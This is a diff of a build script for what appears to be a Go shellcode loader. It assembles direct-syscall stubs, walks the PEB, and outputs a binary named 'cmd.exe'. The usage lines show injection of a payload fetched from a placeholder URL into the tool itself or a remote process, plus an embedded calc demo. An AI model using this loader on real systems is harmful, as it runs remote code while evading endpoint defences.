@@ -2,50 +2,70 @@
 
 echo "Building Go Direct Syscall with External Assembly..."
 
-# Step 1: Assemble the syscall assembly file
+# Step 1: Assemble the assembly files
 echo "Assembling do_syscall.S..."
+echo "Assembling do_call.S..."
 if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "cygwin" ]]; then
     # Windows (Git Bash/MSYS2/Cygwin)
     nasm -f win64 do_syscall.S -o do_syscall.obj
+    nasm -f win64 do_call.S -o do_call.obj
     
     # Also assemble the PEB access assembly file
     echo "Assembling pkg/syscallresolve/peb_windows_amd64.s..."
     # For Go assembly files, we don't need to do anything special
     # Go will handle .s files automatically during build
     
-    OBJ_FILE="do_syscall.obj"
-    LIB_FILE="libdo_syscall.a"
+    SYSCALL_OBJ="do_syscall.obj"
+    CALL_OBJ="do_call.obj"
+    SYSCALL_LIB="libdo_syscall.a"
+    CALL_LIB="libdo_call.a"
     EXE_NAME="cmd.exe"
     export CGO_ENABLED=1
 else
     # Linux/Unix
     nasm -f elf64 do_syscall.S -o do_syscall.o
+    nasm -f elf64 do_call.S -o do_call.o
     
     # Also assemble the PEB access assembly file
     echo "Assembling pkg/syscallresolve/peb_windows_amd64.s..."
     # For Go assembly files, we don't need to do anything special
     # Go will handle .s files automatically during build
     
-    OBJ_FILE="do_syscall.o"
-    LIB_FILE="libdo_syscall.a"
+    SYSCALL_OBJ="do_syscall.o"
+    CALL_OBJ="do_call.o"
+    SYSCALL_LIB="libdo_syscall.a"
+    CALL_LIB="libdo_call.a"
     EXE_NAME="cmd"
     export CGO_ENABLED=1
 fi
 
 # Check if assembly was successful
-if [ ! -f "$OBJ_FILE" ]; then
+if [ ! -f "$SYSCALL_OBJ" ]; then
     echo "Error: Failed to assemble do_syscall.S"
     echo "Make sure NASM is installed and in your PATH"
     exit 1
 fi
 
-# Step 2: Create a static library from the object file
-echo "Creating static library..."
-ar rcs "$LIB_FILE" "$OBJ_FILE"
+if [ ! -f "$CALL_OBJ" ]; then
+    echo "Error: Failed to assemble do_call.S"
+    echo "Make sure NASM is installed and in your PATH"
+    exit 1
+fi
+
+# Step 2: Create static libraries from the object files
+echo "Creating static libraries..."
+ar rcs "$SYSCALL_LIB" "$SYSCALL_OBJ"
+ar rcs "$CALL_LIB" "$CALL_OBJ"
 
 # Check if library creation was successful
-if [ ! -f "$LIB_FILE" ]; then
-    echo "Error: Failed to create static library"
+if [ ! -f "$SYSCALL_LIB" ]; then
+    echo "Error: Failed to create syscall static library"
+    echo "Make sure ar is installed and in your PATH"
+    exit 1
+fi
+
+if [ ! -f "$CALL_LIB" ]; then
+    echo "Error: Failed to create call static library"
     echo "Make sure ar is installed and in your PATH"
     exit 1
 fi
@@ -62,8 +82,14 @@ fi
 
 echo "Build completed successfully!"
 echo "Files created:"
-echo "  - $OBJ_FILE (object file)"
-echo "  - $LIB_FILE (static library)"
+echo "  - $SYSCALL_OBJ (syscall object file)"
+echo "  - $CALL_OBJ (call object file)"
+echo "  - $SYSCALL_LIB (syscall static library)"
+echo "  - $CALL_LIB (call static library)"
 echo "  - $EXE_NAME (executable)"
 echo ""
-echo "Usage: ./$EXE_NAME -url http://example.com/payload.bin" 
+echo "Usage:"
+echo "  ./$EXE_NAME -example                                              # Self injection with embedded calc"
+echo "  ./$EXE_NAME -url http://example.com/payload.bin                   # Remote injection"
+echo "  ./$EXE_NAME -url http://example.com/payload.bin -self             # Self injection"
+echo "  ./$EXE_NAME -dump                                                 # Dump syscalls" 
